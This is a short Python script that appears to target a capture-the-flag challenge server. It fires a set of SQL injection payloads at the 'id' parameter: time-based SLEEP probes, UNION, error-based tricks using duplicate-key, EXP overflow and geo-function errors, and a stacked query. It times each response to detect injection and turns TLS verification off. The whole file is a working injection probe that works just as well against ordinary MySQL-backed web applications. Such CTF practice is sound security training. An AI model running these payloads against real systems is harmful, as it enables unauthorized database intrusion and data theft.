import time
import requests
import urllib3

urllib3.disable_warnings()

s = requests.Session()
s.verify = False
url = "https://04a2b0dcb17c2e99.chal.ctf.ae/"

tests = [
    # Basic
    "1",
    "-1",
    # Timing with AND
    "1 AND SLEEP(3)",
    "1 AND 1=2 AND SLEEP(3)",
    "-1 OR SLEEP(3)",
    "-1 UNION SELECT SLEEP(3)",
    # Error / Fault testing
    "1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)", # Duplicate key error
    "1 AND (SELECT 1 UNION SELECT 2)", # Subquery returns more than 1 row
    "1 AND EXP(710)", # Double value out of range (numeric overflow)
    "1 AND ST_PointFromGeoHash(1, 1)", # Geo error
    "1; SELECT 1",
]

for p in tests:
    t0 = time.time()
    try:
        r = s.get(url, params={"id": p}, timeout=10)
        dur = round(time.time() - t0, 2)
        print(f"[{dur}s] status={r.status_code} len={len(r.content)} payload: {p}")
    except Exception as e:
        dur = round(time.time() - t0, 2)
        print(f"[{dur}s] EXCEPTION: {e} payload: {p}")
